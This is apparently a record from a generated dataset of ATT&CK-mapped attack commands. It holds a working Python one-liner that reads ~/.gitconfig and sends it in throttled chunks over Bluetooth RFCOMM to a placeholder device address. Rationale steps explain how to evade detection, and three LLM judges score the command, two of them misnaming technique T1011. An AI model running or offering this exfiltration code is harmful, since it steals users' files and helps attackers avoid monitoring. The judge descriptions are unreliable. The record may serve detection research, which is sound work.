{
  "technique_id": "T1011",
  "platform": "Linux",
  "shell": "Python",
  "command": "python3 -c \"import socket,os,time; s=socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM); s.settimeout(6); s.connect(('33:44:55:66:77:88', 23)); p=os.path.expanduser('~/.gitconfig'); d=open(p,'rb').read(); [s.send(d[i:i+512]) or time.sleep(0.05) for i in range(0,len(d),512)]; s.close()\"",
  "explanation": "Streams user git configuration over Bluetooth RFCOMM channel 23 in small chunks to blend with low-volume traffic on a non-IP medium per T1011.",
  "rationale_steps": [
    "Use Bluetooth RFCOMM to create an alternate exfil channel.",
    "Select a nonstandard RFCOMM channel (23) to avoid defaults.",
    "Chunk and send data to limit conspicuous burst patterns.",
    "Close the socket to end the session cleanly."
  ],
  "obfuscation_level": "none",
  "id": "SYN-PYTHON-T1011-2e02ce6e-2550bc83",
  "source_prompt_hash": "2e02ce6e",
  "timestamp_utc": "2025-09-30T08:40:28.862749Z",
  "validation": {
    "syntax_ok": null,
    "llm_judgments": [
      {
        "model": "gpt-5",
        "syntactic_score": 5,
        "syntactic_justification": "Well-formed shell quoting and valid Python 3 syntax with balanced parentheses and proper Bluetooth socket usage.",
        "semantic_score": 4,
        "semantic_justification": "It exfiltrates ~/.gitconfig over Bluetooth RFCOMM consistent with T1011, but the 'or time.sleep' logic prevents throttling and s.send may not send full chunks, reducing reliability.",
        "combined_score": 4.5,
        "confidence": 0.8,
        "timestamp": "2025-10-01T21:51:11.984073Z"
      },
      {
        "model": "claude-3-7-sonnet",
        "syntactic_score": 5,
        "syntactic_justification": "The Python command is perfectly well-formed with balanced quotes, parentheses, and proper syntax for Python's socket operations, list comprehension, and file operations.",
        "semantic_score": 4,
        "semantic_justification": "The command correctly implements exfiltration over an alternative protocol (Bluetooth RFCOMM) as described in T1011, but uses a direct Python socket rather than abusing a trusted system script as the proxy mechanism described in the technique.",
        "combined_score": 4.5,
        "confidence": 0.9,
        "timestamp": "2025-10-02T04:02:46.218597Z"
      },
      {
        "model": "gemini-2.0-flash-thinking-exp",
        "syntactic_score": 5,
        "syntactic_justification": "The command uses standard `python3 -c` syntax with correctly balanced quotes, valid Python statements, and proper command-line arguments, making it perfectly well-formed.",
        "semantic_score": 2,
        "semantic_justification": "While the command effectively implements Bluetooth exfiltration, it does not align with T1011 'System Script Proxy Execution,' as it directly executes custom Python code rather than abusing an existing legitimate system script as a proxy.",
        "combined_score": 3.5,
        "confidence": 0.95,
        "timestamp": "2025-10-02T04:02:59.647343Z"
      }
    ],
    "llm_average_syntactic": 5.0,
    "llm_average_semantic": 3.333,
    "llm_average_score": 4.167,
    "llm_verdict": "likely_match",
    "sandbox_trace_id": null,
    "mitre_match_score": null
  }
}